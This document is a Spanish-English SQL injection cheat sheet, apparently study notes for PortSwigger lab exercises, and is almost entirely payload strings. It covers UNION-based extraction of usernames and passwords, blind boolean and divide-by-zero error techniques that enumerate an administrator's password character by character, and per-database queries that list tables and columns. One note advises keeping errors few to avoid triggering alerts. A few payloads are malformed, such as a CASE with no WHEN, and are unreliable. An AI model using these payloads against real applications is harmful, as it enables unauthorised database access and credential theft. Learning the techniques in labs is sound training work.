# SQL INJECTION
## Retrieving hidden data
```
'OR 1=1--
'OR+1=1--
```
## Subverting application logic
```
SELECT * FROM users WHERE username = 'administrator'--'
-- Comment line
```
## Retrieving data from other database tables (UNION)

### Get number of columns

**Metodo 1**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
**Metodo 2**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
### Database-specific syntax
```
ORACLE
UNION SELECT 'Other Value', 2 FROM DUAL--

DB2
UNION SELECT 'Other Value', 2 FROM SYSIBM.SYSDUMMY1--

Para las demás:
UNION SELECT NULL, NULL--
```
### Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving data from other tables
```
Requisitos
-Conocer el nombre de la tabla
-Conocer el nombre de las columnas
Ejemplo:
'UNION SELECT username, password FROM users--
```

### Retrieve interesting data // Examining the database 
**Database type and version**

| Database            | Query                     |
| ------------------- | ------------------------- |
| Microsoft SQL Server| `SELECT @@version`        |
| MySQL               | `SELECT @@version`        |
| Oracle              | `SELECT * FROM v$version` |
| PostgreSQL          | `SELECT version()`        |
| SQLite              | `SELECT sqlite_version()` |
| MariaDB             | `SELECT @@version`        |
| IBM Db2             | `SELECT service_level, fixpack_num FROM TABLE (sysproc.env_get_inst_info())` |
| Amazon Aurora       | `SELECT version()`        |
| SAP HANA            | `SELECT VERSION FROM SYS.M_DATABASE` |
| Amazon RDS          | `SELECT version()`        |
| Google Cloud SQL    | `SELECT version()`        |
| Teradata            | `SELECT INFO FROM dbc.dbcinfo` |
| Informix            | `SELECT DBINFO('version','full') FROM systables WHERE tabid = 1` |
| InterBase           | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Firebird            | `SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database` |
| Snowflake           | `SELECT CURRENT_VERSION()` |
| Vertica             | `SELECT version()`        |
| Netezza             | `SELECT VERSION()`        |
| Clustrix            | `SELECT CLUSTRIX_VERSION()` |

**Listing the contents of the database**
| Database            | Query                                  |
| ------------------- | -------------------------------------- |
| Microsoft SQL Server| `SELECT * FROM information_schema.tables` |
| MySQL               | `SELECT * FROM information_schema.tables` |
| Oracle              | `SELECT * FROM all_tables`             |
| PostgreSQL          | `SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table'` |
| MariaDB             | `SELECT * FROM information_schema.tables` |
| IBM Db2             | `SELECT * FROM syscat.tables`          |
| Amazon Aurora       | `SELECT * FROM information_schema.tables` |
| SAP HANA            | `SELECT * FROM tables`                 |
| Amazon RDS          | `SELECT * FROM information_schema.tables` |
| Google Cloud SQL    | `SELECT * FROM information_schema.tables` |
| Teradata            | `SELECT * FROM dbc.tables`             |
| Informix            | `SELECT * FROM systables`              |
| InterBase           | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Firebird            | `SELECT * FROM RDB$RELATIONS WHERE RDB$RELATION_TYPE = 0` |
| Snowflake           | `SHOW TABLES`                          |
| Vertica             | `SELECT * FROM v_catalog.tables`       |
| Netezza             | `SELECT * FROM _v_table`               |
| Clustrix            | `SELECT * FROM information_schema.tables` |

**Lista solo las tablas creadas por el susuario**
| Database            | Query                                                                                   |
| ------------------- | --------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbo' AND table_type = 'BASE TABLE';` |
| MySQL               | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Oracle              | `SELECT table_name FROM user_tables;`                                                   |
| PostgreSQL          | `SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';` |
| SQLite              | `SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%';`        |
| MariaDB             | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| IBM Db2             | `SELECT table_name FROM syscat.tables WHERE tabschema = 'YOUR_SCHEMA' AND type = 'T';`  |
| Amazon Aurora       | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| SAP HANA            | `SELECT table_name FROM tables WHERE schema_name = 'YOUR_SCHEMA';`                      |
| Amazon RDS          | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Google Cloud SQL    | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |
| Microsoft Access    | `SELECT Name FROM MSysObjects WHERE Type=1 AND Flags=0;`                                 |
| Teradata            | `SELECT table_name FROM dbc.tables WHERE tablekind = 'T' AND databasename = 'your_database_name';` |
| Informix            | `SELECT tabname FROM systables WHERE tabtype = 'T';`                                     |
| InterBase           | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Firebird            | `SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG = 0;`                |
| Snowflake           | `SHOW TABLES IN SCHEMA YOUR_SCHEMA;`                                                    |
| Vertica             | `SELECT table_name FROM v_catalog.tables WHERE is_system_table = false;`                |
| Netezza             | `SELECT table_name FROM _v_table WHERE objtype = 'TABLE';`                              |
| Clustrix            | `SELECT table_name FROM information_schema.tables WHERE table_schema = 'your_database_name' AND table_type = 'BASE TABLE';` |

**Lista las columnas de la tabla**

| Database            | Query                                                                                              |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| Microsoft SQL Server| `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| MySQL               | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Oracle              | `SELECT column_name, data_type FROM user_tab_columns WHERE table_name = 'TABLE';`                   |
| PostgreSQL          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SQLite              | `PRAGMA table_info('table');`                                                                      |
| MariaDB             | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| IBM Db2             | `SELECT colname, typename FROM syscat.columns WHERE tabname = 'TABLE';`                            |
| Amazon Aurora       | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| SAP HANA            | `SELECT column_name, data_type FROM public.tables WHERE table_name = 'TABLE';`                      |
| Amazon RDS          | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Google Cloud SQL    | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |
| Microsoft Access    | `SELECT Name, Type FROM MSysObjects WHERE Type=1 AND Flags=0;`                                      |
| Teradata            | `SELECT columnname, columntype FROM dbc.columns WHERE tablename = 'TABLE';`                        |
| Informix            | `SELECT colname, coltype FROM syscolumns WHERE tabname = 'table';`                                 |
| InterBase           | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Firebird            | `SELECT RDB$FIELD_NAME, RDB$FIELD_TYPE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME = 'TABLE';` |
| Snowflake           | `SHOW COLUMNS IN TABLE table;`                                                                     |
| Vertica             | `SELECT column_name, data_type FROM v_catalog.columns WHERE table_name = 'table';`                  |
| Netezza             | `SELECT columnname, datatype FROM _v_relation_column WHERE tablename = 'TABLE';`                    |
| Clustrix            | `SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';`         |


# SQL Blind

## Errores de lógica
### Comparación verdadera
` 'AND '1'='1 `
### Comparación falsa
` 'AND '1'='2 `

<br><br>**Ejemplo** 
```
Consulta ideal
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'

Compración verdadera
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'AND '1'='1'

Comparación falda
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'AND '1'='2'
```
## Subconsultas condicionales
### Comprobar la existencia de la tabla usuario
` ' AND (SELECT 'a' FROM users LIMIT 1)='a `
### Comprobar la existencia del usuario administrador
` ' AND (SELECT 'a' FROM users WHERE username='administrator')='a `
### Identificar el tamaño de la contraseña de administrador
` ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a `
### Enumeración de la contraseña
` ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a `
<br><br>**Ejemplo** 
```
Consulta ideal
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'

Comprobar la existencia de la tabla usuario
SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'
```
<br><br>**NOTA** Depues la consulta base se pueden añadir el comentario <br>
```
Consulta ideal
SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND TTL<24

Sin comentarios
SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' AND TTL<24 => No evita las demás validaciones

Sentencia con comentarios
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

Con comentarios
SELECT ID FROM TRACK WHERE TRACKID = 'xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--' AND TTL<24 => Evita las validaciones siguientes
```
<br><br>**Nota2**: Ctrl + click copia toda la columna de intruder<br>

## Error de sintaxis
### Comilla simple
` ' `
### Comilla doble (Cadena vacia)
` '' `
<br><br>**Ejemplo** 
```
Consulta ideal
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'

Comilla simple (Genera error)
SELECT ID FROM TRACK WHERE TRACKID = 'xyz''

Comilla doble (Cadena vacia)
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'''
```
## Subconsultas concatenada
Toda concatenación debe tener en cuenta el tipo de dato de las varibles ya que una concatenación ocurre en un tipo cadena por lo que todo se debe convertir en este tipo de dato por eso es necesario el comando `TO_CHAR(Varible/operacion)`
### SQL
` '||(SELECT '')||' `
### SQL Oracle
` '||(SELECT '' FROM dual)||' `
<br><br>**Ejemplo** 
```
Consulta ideal
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'

SQL
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'||(SELECT '')||''

SQL Oracle
SELECT ID FROM TRACK WHERE TRACKID = 'xyz'||(SELECT '' FROM dual)||''

```
## Subconsultas Concatenada aplicadas
### Verificar una tabla
`
No manda error
'||(SELECT '' FROM TablaExiste)||'  
Manda error
'||(SELECT '' FROM TablaQueNoExiste)||'
`
### Subconsulta de una tabla para indetificar si cuenta con valores
``` 
SQL Oracle 
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

SQL (Depende el tipo de consulta tambien puede ser admitido en Oracle)
'||(SELECT '' FROM users WHERE LIMIT 1)||'
```
## Error División por Cero 
### Subconsulta aplicada con Error de División por Cero Verdadera
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END)||'
```
### Subconsulta aplicada con Error de División por Cero Falsa
```
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END)||'
```
### Subconsulta aplicadas con Error de División por Cero - Verificar la existencia de una tabla
```
Se verifica el nombre de la tabla objetivo se espera que no haya errores
'||(SELECT  CASE  THEN '' ELSE TO_CHAR(1/0) FROM users)||'

Se verifica la hipotesis generando una consulta en una tabla que no exista
'||(SELECT  CASE  THEN '' ELSE TO_CHAR(1/0) FROM unaTablaQueNoExiste)||'
```
### Subconsulta aplicadas con Error de División por Cero - Verificar la existencia de un valor en la tabla
```
Es la misma subconsulta realizada de diferentes formas
Esta consulta primero devuelve valores donde el username sea administrator y si existen ejecuta la operación condicional 1=1
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Esta consulta además de lo que hace la anterior limita el numero de filas a devolver a 1, la primera esta en SQL Oracle, la otra en SQL
'||(SELECT CASE WHEN username = 'administrator' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE ROWNUM = 1)||'
'||(SELECT CASE WHEN username = 'administrator' THEN '' ELSE TO_CHAR(1/0) END FROM users LIMIT 1)||'
```
### Subconsulta aplicadas con Error de División por Cero - Verificar la longitud de un valor de un campo de la columna, en este caso la contraseña 
```
Todas las subconsultas hacen lo mismo  pero de diferente manera
'||(SELECT CASE WHEN LENGTH(password)>$1$ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'					
'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>$1$)||'
'||(SELECT CASE ((SELECT 'x' FROM users WHERE username='administrator' and LENGTH(password)=$1$)='x') THEN '' ELSE 1/0 END)||'

Esta es de ChatGPT
'||(SELECT CASE WHEN LENGTH(password) = $1$ THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator' AND ROWNUM = 1)||'
```

### Subconsulta aplicadas con Error de División por Cero - Enumerar campo
```
Todas las subconsultas hacen lo mismo  pero de diferente manera
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'				
'||(select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,1,1)='§a§')||'	
```
<br><br>**NOTA la condicional del error debe generar la menor cantidad de errores posible para no generar alertas es por eso que la solicitud adecuada es la que genera el error y no al reves**


## Subconsulta Condicional
La principal diferencia es que aquí no es necesario convertir todos las variables o resultados a varchar ya que no pertenece a una concatenación de caracteres
### Subconsulta Condicional - Error Lógico
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a																					=>Consulta falsa con adecuado comportamiento
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a																					=>Consulta verdadera con error logico incorporado
```
### Subconsulta Condicional -  Verificar el nombre de una tabla
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users )'
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM tablaQueNoExiste )'
```
### Subconsulta Condicional -  Verificar un capo de una tabla
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'
```
### Subconsulta Condicional -  Verificar la longitud de un valor de un campo de la columna, en este caso la contraseña 
```
' AND (SELECT CASE WHEN LENGTH(password)=$1$ THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'
```
### Subconsulta Condicional -  Enumerar campo
```
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN 1/0 ELSE '' END FROM users WHERE username='administrator')'	
```
<br><br> **Nota: Ctrl + click copia toda la columna de intruder**
# Final
Cheat Sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
